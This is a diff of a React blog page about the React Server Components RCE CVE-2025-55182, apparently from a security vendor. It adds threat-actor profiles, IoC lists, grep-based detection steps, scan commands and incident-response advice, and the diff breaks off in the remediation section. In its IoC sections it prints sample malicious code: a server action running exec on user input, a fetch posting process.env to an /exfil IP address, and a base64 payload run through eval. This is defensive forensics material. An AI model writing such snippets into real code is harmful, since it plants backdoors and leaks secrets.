@@ -815,10 +815,13 @@ const CVE202555182Post: React.FC = () => {
 
   const toc = [
     { id: "what-is-cve-2025-55182", title: "What is CVE-2025-55182?", level: 1 },
+    { id: "threat-landscape", title: "Threat Landscape: Active Exploitation", level: 1 },
+    { id: "exploitation-timeline", title: "Exploitation Timeline", level: 1 },
     { id: "am-i-affected", title: "Am I Affected?", level: 1 },
+    { id: "am-i-compromised", title: "Am I Already Compromised?", level: 1 },
     { id: "one-command-fix", title: "One-Command Fix with NeuroLint", level: 1 },
+    { id: "post-patch-forensics", title: "Post-Patch Forensics", level: 1 },
     { id: "manual-fix", title: "Manual Fix Steps", level: 1 },
-    { id: "what-the-fix-does", title: "What the Fix Does", level: 1 },
     { id: "verification", title: "Verifying Your Fix", level: 1 },
   ];
 
@@ -882,15 +885,17 @@ const CVE202555182Post: React.FC = () => {
                 <li><strong className="text-white">Type:</strong> Remote Code Execution (RCE)</li>
                 <li><strong className="text-white">Attack Vector:</strong> Network (Unauthenticated)</li>
                 <li><strong className="text-white">Disclosed:</strong> December 3, 2025</li>
+                <li><strong className="text-white">Exploitation Status:</strong> <span className="text-white">Actively Exploited in the Wild</span></li>
               </ul>
             </div>
             <div>
               <h4 className="text-white font-semibold mb-2">Affected Packages</h4>
               <ul className="space-y-2 text-gray-300 text-sm">
+                <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">react</code> 19.0.0, 19.1.0, 19.1.1, 19.2.0</li>
                 <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">react-server-dom-webpack</code></li>
                 <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">react-server-dom-parcel</code></li>
                 <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">react-server-dom-turbopack</code></li>
-                <li><strong className="text-white">Versions:</strong> 19.0.0, 19.1.0, 19.1.1, 19.2.0</li>
+                <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">next</code> 15.0.0-15.0.4, 16.0.0-16.0.6, 16.2.0</li>
               </ul>
             </div>
           </div>
@@ -903,6 +908,101 @@ const CVE202555182Post: React.FC = () => {
         <p>
           The vulnerability exists in the "Flight" protocol used by RSC to handle server-to-client communication. When the server receives a malformed payload, it fails to validate the structure correctly, allowing attacker-controlled data to achieve <strong>unauthenticated remote code execution</strong>.
         </p>
+
+        <p>
+          This vulnerability is particularly dangerous because:
+        </p>
+
+        <div className="space-y-2 my-6 not-prose">
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="text-white font-bold text-sm flex-shrink-0">1.</span>
+            <span className="text-gray-300"><strong className="text-white">No authentication required</strong> - Attackers can exploit without any credentials</span>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="text-white font-bold text-sm flex-shrink-0">2.</span>
+            <span className="text-gray-300"><strong className="text-white">Remote exploitation</strong> - Can be triggered over the network from anywhere</span>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="text-white font-bold text-sm flex-shrink-0">3.</span>
+            <span className="text-gray-300"><strong className="text-white">Server-side execution</strong> - Attacker gains code execution on your server, not just client</span>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="text-white font-bold text-sm flex-shrink-0">4.</span>
+            <span className="text-gray-300"><strong className="text-white">Public PoC available</strong> - Proof-of-concept exploits are publicly circulating</span>
+          </div>
+        </div>
+
+        <h2 id="threat-landscape" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Threat Landscape: Active Exploitation
+        </h2>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Known Threat Actors</h4>
+          <p className="text-gray-400 text-sm mb-4">
+            Security researchers have identified multiple sophisticated threat groups actively exploiting CVE-2025-55182:
+          </p>
+          <div className="grid md:grid-cols-2 gap-4">
+            <div className="bg-zinc-800/50 border border-black rounded-lg p-4">
+              <h5 className="text-white font-semibold mb-2">Earth Lamia (China-nexus)</h5>
+              <ul className="space-y-1 text-gray-300 text-sm">
+                <li>Targeting enterprise React/Next.js deployments</li>
+                <li>Focus on intellectual property theft</li>
+                <li>Advanced persistent threat (APT) techniques</li>
+                <li>Known for supply chain compromise</li>
+              </ul>
+            </div>
+            <div className="bg-zinc-800/50 border border-black rounded-lg p-4">
+              <h5 className="text-white font-semibold mb-2">Jackpot Panda (China-nexus)</h5>
+              <ul className="space-y-1 text-gray-300 text-sm">
+                <li>Cryptocurrency and financial sector targeting</li>
+                <li>Credential harvesting operations</li>
+                <li>Lateral movement via server access</li>
+                <li>Uses exploit for initial access</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          Beyond these named groups, security firms have observed <strong>widespread exploitation</strong> by ransomware operators and financially-motivated attackers who have weaponized public PoC code within days of disclosure.
+        </p>
+
+        <h2 id="exploitation-timeline" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Exploitation Timeline
+        </h2>
+
+        <div className="space-y-4 my-8 not-prose">
+          <div className="flex gap-4 items-start">
+            <div className="w-24 flex-shrink-0 text-sm text-gray-400">Nov 2025</div>
+            <div className="flex-1 bg-zinc-900/50 border border-black rounded-lg p-4">
+              <p className="text-gray-300 text-sm">Vulnerability discovered and privately reported to React team</p>
+            </div>
+          </div>
+          <div className="flex gap-4 items-start">
+            <div className="w-24 flex-shrink-0 text-sm text-gray-400">Dec 3, 2025</div>
+            <div className="flex-1 bg-zinc-900/50 border border-black rounded-lg p-4">
+              <p className="text-gray-300 text-sm">Public disclosure and patch release (React 19.0.1, 19.1.2, 19.2.1)</p>
+            </div>
+          </div>
+          <div className="flex gap-4 items-start">
+            <div className="w-24 flex-shrink-0 text-sm text-white font-semibold">Dec 4, 2025</div>
+            <div className="flex-1 bg-zinc-900/50 border border-black rounded-lg p-4">
+              <p className="text-white text-sm font-semibold">First public PoC exploit published</p>
+            </div>
+          </div>
+          <div className="flex gap-4 items-start">
+            <div className="w-24 flex-shrink-0 text-sm text-white font-semibold">Dec 5, 2025</div>
+            <div className="flex-1 bg-zinc-900/50 border border-black rounded-lg p-4">
+              <p className="text-white text-sm font-semibold">Widespread exploitation observed by security firms</p>
+            </div>
+          </div>
+          <div className="flex gap-4 items-start">
+            <div className="w-24 flex-shrink-0 text-sm text-gray-400">Dec 6, 2025</div>
+            <div className="flex-1 bg-zinc-900/50 border border-black rounded-lg p-4">
+              <p className="text-gray-300 text-sm">Earth Lamia and Jackpot Panda campaigns identified</p>
+            </div>
+          </div>
+        </div>
 
         <h2 id="am-i-affected" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
           Am I Affected?
@@ -967,6 +1067,74 @@ const CVE202555182Post: React.FC = () => {
           <code className="text-gray-300">{`npm list react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack`}</code>
         </pre>
 
+        <h2 id="am-i-compromised" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Am I Already Compromised?
+        </h2>
+
+        <p>
+          If your application was vulnerable between December 3-7, 2025, you may have already been exploited. <strong>Patching alone is not sufficient</strong> - you need to verify your systems haven't been compromised.
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Scan for Indicators of Compromise (IoCs)</h4>
+          <p className="text-gray-400 text-sm mb-4">
+            NeuroLint's Layer 8 Security Forensics can detect post-exploitation indicators:
+          </p>
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm mb-4">
+            <code className="text-gray-300">{`# Scan your codebase for compromise indicators
+npx @neurolint/cli security:scan-compromise . --deep
+
+# Create a baseline for future comparison
+npx @neurolint/cli security:create-baseline .
+
+# Full incident response scan
+npx @neurolint/cli security:incident-response .`}</code>
+          </pre>
+        </div>
+
+        <h3 className="text-2xl font-bold text-white mt-8 mb-4">Common Post-Exploitation Indicators</h3>
+
+        <p>
+          Attackers exploiting CVE-2025-55182 typically leave the following traces. NeuroLint detects these automatically:
+        </p>
+
+        <div className="space-y-3 my-6 not-prose">
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Malicious Server Actions</h5>
+            <p className="text-gray-400 text-sm mb-2">Server actions with <code className="text-blue-400 bg-zinc-800 px-1 rounded">exec()</code>, <code className="text-blue-400 bg-zinc-800 px-1 rounded">spawn()</code>, or <code className="text-blue-400 bg-zinc-800 px-1 rounded">eval()</code> that weren't in your original code</p>
+            <pre className="bg-black/50 border border-black rounded-lg p-3 text-xs overflow-x-auto">
+              <code className="text-gray-300">{`// Suspicious: exec in server action
+'use server';
+export async function action(data) {
+  exec(data.cmd); // <-- IoC: shell execution in server action
+}`}</code>
+            </pre>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Environment Variable Exfiltration</h5>
+            <p className="text-gray-400 text-sm mb-2">Code that exposes <code className="text-blue-400 bg-zinc-800 px-1 rounded">process.env</code> to external endpoints</p>
+            <pre className="bg-black/50 border border-black rounded-lg p-3 text-xs overflow-x-auto">
+              <code className="text-gray-300">{`// Suspicious: env vars sent to external IP
+fetch('https://192.168.1.100/exfil', {
+  body: JSON.stringify(process.env)
+});`}</code>
+            </pre>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Obfuscated Payloads</h5>
+            <p className="text-gray-400 text-sm mb-2">Base64-encoded strings that decode to malicious code</p>
+            <pre className="bg-black/50 border border-black rounded-lg p-3 text-xs overflow-x-auto">
+              <code className="text-gray-300">{`// Suspicious: encoded payload execution
+const payload = atob('ZXZhbCgiYWxlcnQoMSkiKQ==');
+eval(payload);`}</code>
+            </pre>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Suspicious Network Connections</h5>
+            <p className="text-gray-400 text-sm">Requests to raw IP addresses or known malicious domains</p>
+          </div>
+        </div>
+
         <h2 id="one-command-fix" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
           One-Command Fix with NeuroLint
         </h2>
@@ -1017,6 +1185,57 @@ npm install`}</code>
           </div>
         </div>
 
+        <h2 id="post-patch-forensics" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Post-Patch Forensics
+        </h2>
+
+        <p>
+          After patching, it's critical to verify your system wasn't compromised during the vulnerability window. Here's a comprehensive forensics workflow:
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Complete Security Workflow</h4>
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm mb-4">
+            <code className="text-gray-300">{`# Step 1: Patch the vulnerability
+npx @neurolint/cli security:cve-2025-55182 . --fix
+npm install
+
+# Step 2: Scan for compromise indicators
+npx @neurolint/cli security:scan-compromise . --deep
+
+# Step 3: Create baseline for future monitoring
+npx @neurolint/cli security:create-baseline .
+
+# Step 4: Compare against baseline periodically
+npx @neurolint/cli security:compare-baseline .`}</code>
+          </pre>
+        </div>
+
+        <h3 className="text-2xl font-bold text-white mt-8 mb-4">Layer 8 Security Forensics Capabilities</h3>
+
+        <p>
+          NeuroLint's Layer 8 provides comprehensive security forensics for React/Next.js applications:
+        </p>
+
+        <div className="grid md:grid-cols-2 gap-4 my-6 not-prose">
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">80+ IoC Signatures</h5>
+            <p className="text-gray-400 text-sm">Detects known malicious patterns, backdoors, and suspicious code</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">AST-Based Analysis</h5>
+            <p className="text-gray-400 text-sm">Deep code analysis that can't be evaded by obfuscation</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">RSC-Specific Detection</h5>
+            <p className="text-gray-400 text-sm">5 behavioral patterns specific to React Server Components</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">Baseline Comparison</h5>
+            <p className="text-gray-400 text-sm">Track file integrity and detect unauthorized modifications</p>
+          </div>
+        </div>
+
         <h2 id="manual-fix" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
           Manual Fix Steps
         </h2>
@@ -1041,14 +1260,6 @@ npm install next@16.0.7  # or 16.1.0, 16.2.1`}</code>
           </pre>
         </div>
 
-        <h2 id="what-the-fix-does" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
-          What the Fix Does
-        </h2>
-
-        <p>
-          The patched versions fix the deserialization vulnerability in the Flight protocol by properly validating incoming payloads before processing them. This prevents attackers from injecting malicious data that could lead to code execution.
-        </p>
-
         <h2 id="verification" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
           Verifying Your Fix
         </h2>
@@ -1060,13 +1271,16 @@ npm install next@16.0.7  # or 16.1.0, 16.2.1`}</code>
 npm list react
 
 # Check Next.js version (should be 15.0.5+, 15.1.9+, 15.2.6+, 15.3.6+, 15.4.8+, 15.5.7+, 16.0.7+, 16.1.0+, or 16.2.1+)
-npm list next`}</code>
+npm list next
+
+# Verify no vulnerable packages remain
+npx @neurolint/cli security:cve-2025-55182 . --dry-run`}</code>
         </pre>
 
         <div className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 border border-black rounded-xl p-6 my-8 not-prose">
           <h4 className="text-white font-semibold mb-4">Need Help?</h4>
           <p className="text-gray-300 mb-4">
-            If you encounter issues while patching, open an issue on GitHub or contact us.
+            If you encounter issues while patching or suspect your system has been compromised, we're here to help.
           </p>
           <div className="flex flex-wrap gap-3">
             <a
@@ -1077,13 +1291,754 @@ npm list next`}</code>
             >
               Open GitHub Issue
             </a>
+            <Link
+              to="/blog/detecting-post-exploitation-cve-2025-55182"
+              className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 text-white rounded-lg hover:bg-zinc-700 transition-colors text-sm"
+            >
+              Post-Exploitation Guide
+            </Link>
+            <Link
+              to="/blog/layer-8-security-forensics-deep-dive"
+              className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-800 text-white rounded-lg hover:bg-zinc-700 transition-colors text-sm"
+            >
+              Layer 8 Deep Dive
+            </Link>
+          </div>
+        </div>
+      </div>
+    </article>
+  );
+};
+
+const PostExploitationGuide: React.FC = () => {
+  const [copied, setCopied] = React.useState(false);
+
+  const copyCommand = (cmd: string) => {
+    navigator.clipboard.writeText(cmd);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const toc = [
+    { id: "introduction", title: "Introduction", level: 1 },
+    { id: "signs-of-compromise", title: "Signs Your System Was Exploited", level: 1 },
+    { id: "automated-detection", title: "Automated Detection with NeuroLint", level: 1 },
+    { id: "ioc-categories", title: "Indicator Categories Explained", level: 1 },
+    { id: "manual-investigation", title: "Manual Investigation Steps", level: 1 },
+    { id: "incident-response", title: "Incident Response Workflow", level: 1 },
+    { id: "remediation", title: "Remediation Steps", level: 1 },
+  ];
+
+  return (
+    <article className="max-w-none">
+      <div className="bg-zinc-900/80 border border-black rounded-xl p-6 mb-8">
+        <div className="flex items-start gap-4">
+          <div className="w-10 h-10 bg-zinc-800 border border-black rounded-lg flex items-center justify-center flex-shrink-0">
+            <span className="text-white text-lg font-bold">!</span>
+          </div>
+          <div>
+            <h4 className="text-white font-semibold mb-2">Quick Compromise Scan</h4>
+            <p className="text-gray-300 mb-3 text-base">
+              Run this command to scan for post-exploitation indicators:
+            </p>
+            <div className="bg-zinc-800 border border-black rounded-lg p-3 relative group">
+              <code className="text-green-400 font-mono text-sm">npx @neurolint/cli security:scan-compromise . --deep</code>
+              <button
+                onClick={() => copyCommand('npx @neurolint/cli security:scan-compromise . --deep')}
+                className="absolute right-2 top-1/2 -translate-y-1/2 p-1.5 hover:bg-white/10 rounded transition-colors"
+                aria-label="Copy command"
+              >
+                {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-gray-400" />}
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <nav className="bg-zinc-900/80 border border-black rounded-xl p-6 mb-12">
+        <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
+          <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 10h16M4 14h16M4 18h16" />
+          </svg>
+          Table of Contents
+        </h3>
+        <ul className="space-y-2">
+          {toc.map((item) => (
+            <li key={item.id}>
+              <a href={`#${item.id}`} className="text-gray-400 hover:text-blue-400 transition-colors text-sm">
+                {item.title}
+              </a>
+            </li>
+          ))}
+        </ul>
+      </nav>
+
+      <div className="prose prose-invert prose-lg max-w-none prose-headings:font-bold prose-headings:text-white prose-p:text-gray-300 prose-a:text-blue-400 prose-a:no-underline hover:prose-a:text-blue-300 prose-strong:text-white prose-code:text-blue-400 prose-code:bg-zinc-900 prose-code:px-1.5 prose-code:py-0.5 prose-code:rounded prose-code:font-normal">
+        
+        <h2 id="introduction" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Introduction
+        </h2>
+
+        <p>
+          With CVE-2025-55182 being actively exploited in the wild since December 4, 2025, the question isn't just "Am I vulnerable?" but "<strong>Have I already been compromised?</strong>"
+        </p>
+
+        <p>
+          This guide provides a comprehensive approach to detecting post-exploitation indicators in React/Next.js applications. Even if you've patched the vulnerability, attackers may have already established persistence mechanisms in your codebase.
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Critical Questions</h4>
+          <ul className="space-y-2 text-gray-300 text-sm">
+            <li>Was your vulnerable application exposed to the internet between Dec 3-7, 2025?</li>
+            <li>Have you noticed any unexplained file changes in your codebase?</li>
+            <li>Are there new server actions or API routes you didn't create?</li>
+            <li>Has your application been making unexpected outbound network requests?</li>
+          </ul>
+        </div>
+
+        <h2 id="signs-of-compromise" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Signs Your System Was Exploited
+        </h2>
+
+        <p>
+          Attackers exploiting CVE-2025-55182 typically leave several traces. Here are the key indicators to look for:
+        </p>
+
+        <h3 className="text-2xl font-bold text-white mt-8 mb-4">Code-Level Indicators</h3>
+
+        <div className="space-y-4 my-6 not-prose">
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2 flex items-center gap-2">
+              <span className="w-6 h-6 bg-zinc-800 border border-black rounded flex items-center justify-center text-sm text-white">1</span>
+              New Server Actions with Dangerous Code
+            </h5>
+            <p className="text-gray-400 text-sm mb-2">Look for <code className="text-blue-400 bg-zinc-800 px-1 rounded">'use server'</code> files containing:</p>
+            <ul className="text-gray-300 text-sm space-y-1 ml-4">
+              <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">exec()</code>, <code className="text-blue-400 bg-zinc-800 px-1 rounded">spawn()</code>, <code className="text-blue-400 bg-zinc-800 px-1 rounded">execSync()</code></li>
+              <li><code className="text-blue-400 bg-zinc-800 px-1 rounded">eval()</code> or <code className="text-blue-400 bg-zinc-800 px-1 rounded">new Function()</code></li>
+              <li>Direct <code className="text-blue-400 bg-zinc-800 px-1 rounded">process.env</code> exposure</li>
+            </ul>
+          </div>
+
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2 flex items-center gap-2">
+              <span className="w-6 h-6 bg-zinc-800 border border-black rounded flex items-center justify-center text-sm text-white">2</span>
+              Obfuscated Code Blocks
+            </h5>
+            <p className="text-gray-400 text-sm mb-2">Suspicious patterns include:</p>
+            <ul className="text-gray-300 text-sm space-y-1 ml-4">
+              <li>Long base64-encoded strings (500+ characters)</li>
+              <li>Heavy use of Unicode escapes (<code className="text-blue-400 bg-zinc-800 px-1 rounded">\u0065\u0076\u0061\u006c</code>)</li>
+              <li>String concatenation to build function names</li>
+              <li>eval wrapped in multiple layers of decoding</li>
+            </ul>
+          </div>
+
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2 flex items-center gap-2">
+              <span className="w-6 h-6 bg-zinc-800 border border-black rounded flex items-center justify-center text-sm text-white">3</span>
+              Suspicious Network Requests
+            </h5>
+            <p className="text-gray-400 text-sm mb-2">Connections to:</p>
+            <ul className="text-gray-300 text-sm space-y-1 ml-4">
+              <li>Raw IP addresses (especially non-local)</li>
+              <li>Known exfiltration domains (pastebin, webhook.site, etc.)</li>
+              <li>WebSocket connections to unknown hosts</li>
+              <li>Requests with <code className="text-blue-400 bg-zinc-800 px-1 rounded">process.env</code> in the body</li>
+            </ul>
+          </div>
+
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2 flex items-center gap-2">
+              <span className="w-6 h-6 bg-zinc-800 border border-black rounded flex items-center justify-center text-sm text-white">4</span>
+              Prototype Pollution Patterns
+            </h5>
+            <p className="text-gray-400 text-sm">Code modifying <code className="text-blue-400 bg-zinc-800 px-1 rounded">__proto__</code> or <code className="text-blue-400 bg-zinc-800 px-1 rounded">Object.prototype</code> to establish persistence</p>
+          </div>
+        </div>
+
+        <h2 id="automated-detection" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Automated Detection with NeuroLint
+        </h2>
+
+        <p>
+          NeuroLint's Layer 8 Security Forensics provides automated detection of 80+ IoC signatures and 5 RSC-specific behavioral patterns.
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Detection Commands</h4>
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm mb-4">
+            <code className="text-gray-300">{`# Quick scan (fastest, common patterns only)
+npx @neurolint/cli security:scan-compromise . --quick
+
+# Standard scan (balanced, recommended)
+npx @neurolint/cli security:scan-compromise .
+
+# Deep scan (thorough, all IoC signatures)
+npx @neurolint/cli security:scan-compromise . --deep
+
+# Paranoid mode (maximum sensitivity, may have false positives)
+npx @neurolint/cli security:scan-compromise . --paranoid`}</code>
+          </pre>
+        </div>
+
+        <h3 className="text-2xl font-bold text-white mt-8 mb-4">Scan Output Example</h3>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-6 not-prose">
+          <pre className="text-sm text-gray-300 overflow-x-auto">{`SECURITY SCAN RESULTS
+=====================
+
+Scanned: 247 files
+Findings: 3 CRITICAL, 1 HIGH, 2 MEDIUM
+
+CRITICAL FINDINGS:
+
+[NEUROLINT-SEC-001] Shell Command in Server Action
+  File: app/actions/admin.ts:15
+  Code: exec(formData.get('cmd'))
+  Severity: CRITICAL
+  Category: BACKDOOR
+
+[NEUROLINT-SEC-007] Network Request to IP Address  
+  File: app/api/sync/route.ts:23
+  Code: fetch('http://192.168.1.100/exfil', ...)
+  Severity: CRITICAL
+  Category: DATA_EXFILTRATION
+
+[NEUROLINT-SEC-018] Encoded Malicious Payload
+  File: lib/utils/helper.ts:89
+  Base64 decodes to: eval(atob("..."))
+  Severity: CRITICAL
+  Category: OBFUSCATION`}</pre>
+        </div>
+
+        <h2 id="ioc-categories" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Indicator Categories Explained
+        </h2>
+
+        <div className="grid md:grid-cols-2 gap-4 my-8 not-prose">
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">BACKDOOR</h5>
+            <p className="text-gray-400 text-sm">Code providing unauthorized remote access - shell commands, reverse shells, remote code execution</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">DATA_EXFILTRATION</h5>
+            <p className="text-gray-400 text-sm">Code stealing sensitive data - env vars, credentials, API keys sent externally</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">CODE_INJECTION</h5>
+            <p className="text-gray-400 text-sm">Dynamic code execution - eval, Function constructor, innerHTML with scripts</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">OBFUSCATION</h5>
+            <p className="text-gray-400 text-sm">Hidden malicious code - base64 payloads, unicode escapes, string building</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">NETWORK</h5>
+            <p className="text-gray-400 text-sm">Suspicious connectivity - C2 communication, requests to raw IPs, WebSocket to unknown hosts</p>
+          </div>
+          <div className="bg-zinc-900/50 border border-black rounded-lg p-4">
+            <h5 className="text-white font-semibold mb-2">RSC_SPECIFIC</h5>
+            <p className="text-gray-400 text-sm">React Server Component patterns - dangerous server actions, SSRF via server components</p>
+          </div>
+        </div>
+
+        <h2 id="manual-investigation" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Manual Investigation Steps
+        </h2>
+
+        <p>
+          If automated scanning finds issues, or you want to manually verify, follow these steps:
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Step 1: Check Git History</h4>
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm">
+            <code className="text-gray-300">{`# Find changes during vulnerability window (Dec 3-7)
+git log --after="2025-12-03" --before="2025-12-08" --oneline
+
+# Look for commits from unknown authors
+git log --all --format="%an %ae" | sort | uniq
+
+# Check for force pushes that might have been used to cover tracks
+git reflog --all`}</code>
+          </pre>
+        </div>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Step 2: Search for Suspicious Patterns</h4>
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm">
+            <code className="text-gray-300">{`# Find all 'use server' files
+grep -r "'use server'" --include="*.ts" --include="*.tsx" --include="*.js"
+
+# Look for exec/spawn in server code
+grep -rn "exec\\|spawn\\|execSync" --include="*.ts" --include="*.tsx"
+
+# Find long base64 strings
+grep -rn "[A-Za-z0-9+/]\\{500,\\}" --include="*.ts" --include="*.tsx" --include="*.js"`}</code>
+          </pre>
+        </div>
+
+        <h2 id="incident-response" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Incident Response Workflow
+        </h2>
+
+        <p>
+          If you've confirmed a compromise, follow this incident response workflow:
+        </p>
+
+        <div className="space-y-3 my-6 not-prose">
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="w-6 h-6 bg-white/10 rounded flex items-center justify-center text-white text-sm flex-shrink-0">1</span>
+            <div>
+              <span className="text-white font-semibold">Isolate</span>
+              <p className="text-gray-400 text-sm">Take affected systems offline to prevent further damage</p>
+            </div>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="w-6 h-6 bg-white/10 rounded flex items-center justify-center text-white text-sm flex-shrink-0">2</span>
+            <div>
+              <span className="text-white font-semibold">Preserve Evidence</span>
+              <p className="text-gray-400 text-sm">Create forensic copies before making any changes</p>
+            </div>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="w-6 h-6 bg-white/10 rounded flex items-center justify-center text-white text-sm flex-shrink-0">3</span>
+            <div>
+              <span className="text-white font-semibold">Rotate All Secrets</span>
+              <p className="text-gray-400 text-sm">Assume all environment variables and API keys are compromised</p>
+            </div>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="w-6 h-6 bg-white/10 rounded flex items-center justify-center text-white text-sm flex-shrink-0">4</span>
+            <div>
+              <span className="text-white font-semibold">Clean Codebase</span>
+              <p className="text-gray-400 text-sm">Remove all malicious code and restore from known-good backup</p>
+            </div>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="w-6 h-6 bg-white/10 rounded flex items-center justify-center text-white text-sm flex-shrink-0">5</span>
+            <div>
+              <span className="text-white font-semibold">Patch and Verify</span>
+              <p className="text-gray-400 text-sm">Apply CVE-2025-55182 patch and verify no vulnerable versions remain</p>
+            </div>
+          </div>
+          <div className="flex items-start gap-3 p-3 bg-zinc-900/50 rounded-lg border border-black">
+            <span className="w-6 h-6 bg-white/10 rounded flex items-center justify-center text-white text-sm flex-shrink-0">6</span>
+            <div>
+              <span className="text-white font-semibold">Establish Baseline</span>
+              <p className="text-gray-400 text-sm">Create integrity baseline for future monitoring</p>
+            </div>
+          </div>
+        </div>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
+          <h4 className="text-white font-semibold mb-4">Full Incident Response Command</h4>
+          <pre className="bg-black/50 border border-black rounded-lg p-4 overflow-x-auto text-sm">
+            <code className="text-gray-300">{`# Run comprehensive incident response scan
+npx @neurolint/cli security:incident-response . --output=./incident-report.json`}</code>
+          </pre>
+        </div>
+
+        <h2 id="remediation" className="text-3xl font-bold text-white mt-12 mb-6 scroll-mt-24">
+          Remediation Steps
+        </h2>
+
+        <p>
+          After identifying compromised code, follow these remediation steps:
+        </p>
+
+        <div className="bg-zinc-900/80 border border-black rounded-xl p-6 my-8 not-prose">
